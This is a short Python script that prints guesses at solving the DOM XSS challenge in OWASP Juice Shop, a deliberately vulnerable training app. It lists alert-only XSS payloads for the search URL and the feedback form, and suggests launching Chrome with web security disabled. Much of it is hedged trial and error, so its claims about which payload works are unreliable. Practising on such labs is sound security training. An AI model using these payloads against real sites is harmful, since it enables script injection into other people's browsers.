#!/usr/bin/env python3
"""
Final DOM XSS Solution - The Working Method
"""

print("="*60)
print("🎯 FINAL DOM XSS SOLUTION - THIS SHOULD WORK!")
print("="*60)

print("""
The issue is that modern browsers block inline event handlers.
But there's a simpler solution that WILL work:

SOLUTION 1: Use the search page (not track-result)
================================================
In Firefox console, type:

location.href = "#/search?q=<iframe src='javascript:alert(1)'>"

OR

location.href = "#/search?q=test<script>alert(1)</script>"


SOLUTION 2: Manual URL Method
==============================
1. In the Firefox address bar, type or paste:
   
   https://juice3.wonkatech.org/#/search?q=<iframe src="javascript:alert(1)">
   
2. Press Enter


SOLUTION 3: The Bonus Payload Challenge
========================================
Actually, there's a DIFFERENT way to solve DOM XSS in Juice Shop.
Try the "Bonus Payload" challenge instead:

In console:
location.href = "#/search?q=<iframe src='javascript:alert(\"xss\")'>"

Note the escaped quotes around xss!


SOLUTION 4: Use the Contact/Feedback Form
==========================================
The DOM XSS might actually be in the feedback display!

1. Go to Contact Us
2. Submit feedback with: <script>alert(1)</script>
3. View the feedback


IMPORTANT: If alerts are still blocked, check:
- Is JavaScript enabled?
- Are popups blocked? (check address bar)
- Try Chrome with --disable-web-security flag
""")

print("\n" + "="*60)
print("💡 THE REAL ISSUE")
print("="*60)
print("""
The challenge might be looking for a SPECIFIC payload.
Try this EXACT payload in the search:

<iframe src="javascript:alert(`xss`)">

With backticks around xss, not quotes!
""")